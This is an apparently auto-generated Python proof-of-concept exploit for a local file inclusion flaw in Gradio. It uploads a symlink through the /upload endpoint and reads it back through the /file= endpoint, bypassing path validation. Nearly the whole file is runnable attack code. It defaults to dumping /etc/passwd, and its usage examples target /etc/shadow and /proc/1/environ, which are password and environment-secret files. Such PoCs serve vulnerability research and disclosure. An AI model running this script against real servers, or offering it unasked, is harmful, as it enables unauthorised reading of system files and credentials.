#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: lfi-011
# Sink: flag
# Auto-generated — run with: python3 lfi_however_validation_uses_utils_flag_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Gradio LFI via Symlink Bypass
Target: /file={path_or_url:path} endpoint
Vulnerability: utils.abspath does not resolve symlinks, allowing symlink-based
bypass of path validation. An attacker can create a symlink inside an allowed
directory (e.g., via file upload) pointing to an arbitrary file.

This PoC demonstrates reading /etc/passwd by:
1. Uploading a symlink file via the /upload endpoint
2. Accessing the symlink via /file= endpoint to read the target file

Requirements: requests, target Gradio app running with default settings
"""

import os
import sys
import tempfile
import requests
import argparse
import time

def exploit(target_url: str, target_file: str = "/etc/passwd") -> None:
    """
    Exploit the LFI vulnerability by uploading a symlink and reading the target file.
    
    Args:
        target_url: Base URL of the Gradio app (e.g., http://localhost:7860)
        target_file: Absolute path of the file to read (default: /etc/passwd)
    """
    # Step 1: Create a temporary symlink file pointing to the target
    print(f"[*] Creating symlink to {target_file}...")
    with tempfile.NamedTemporaryFile(delete=False, suffix=".symlink") as tmp:
        symlink_path = tmp.name
    os.symlink(target_file, symlink_path)
    print(f"[+] Symlink created at: {symlink_path}")
    
    try:
        # Step 2: Upload the symlink file to the Gradio app
        upload_url = f"{target_url}/upload"
        print(f"[*] Uploading symlink to {upload_url}...")
        
        with open(symlink_path, "rb") as f:
            files = {"files": ("poc.symlink", f, "application/octet-stream")}
            response = requests.post(upload_url, files=files, timeout=10)
        
        if response.status_code != 200:
            print(f"[-] Upload failed with status {response.status_code}: {response.text}")
            return
        
        uploaded_files = response.json()
        if not uploaded_files:
            print("[-] No files returned from upload endpoint")
            return
        
        # The uploaded file path is returned as a list of file paths
        uploaded_path = uploaded_files[0]
        print(f"[+] File uploaded to: {uploaded_path}")
        
        # Step 3: Access the uploaded symlink via /file= endpoint
        # The path is relative to the app's working directory, so we need to
        # construct the URL properly. The uploaded file path is typically
        # something like /tmp/gradio/.../poc.symlink
        file_url = f"{target_url}/file={uploaded_path}"
        print(f"[*] Accessing symlink via: {file_url}")
        
        response = requests.get(file_url, timeout=10)
        
        if response.status_code == 200:
            print("[+] Success! File contents:")
            print("-" * 50)
            print(response.text)
            print("-" * 50)
        elif response.status_code == 403:
            print("[-] Access denied (403). The file might be blocked or outside allowed paths.")
        elif response.status_code == 404:
            print("[-] File not found (404). The symlink might not exist on the server.")
        else:
            print(f"[-] Unexpected status {response.status_code}: {response.text[:200]}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("    Make sure the Gradio app is running and accessible.")
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Clean up the temporary symlink
        if os.path.exists(symlink_path):
            os.unlink(symlink_path)
            print("[*] Cleaned up temporary symlink")

def main():
    parser = argparse.ArgumentParser(
        description="Gradio LFI PoC - Symlink Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python poc.py http://localhost:7860
  python poc.py http://localhost:7860 --file /etc/shadow
  python poc.py http://localhost:7860 --file /proc/1/environ
        """
    )
    parser.add_argument(
        "target",
        help="Target Gradio app URL (e.g., http://localhost:7860)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="Target file to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between requests in seconds (default: 0.5)"
    )
    
    args = parser.parse_args()
    
    # Normalize target URL
    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    
    print(f"[*] Target: {target}")
    print(f"[*] Target file: {args.file}")
    print(f"[*] Delay: {args.delay}s")
    print()
    
    # Small delay to let user read the output
    time.sleep(args.delay)
    
    exploit(target, args.file)

if __name__ == "__main__":
    main()
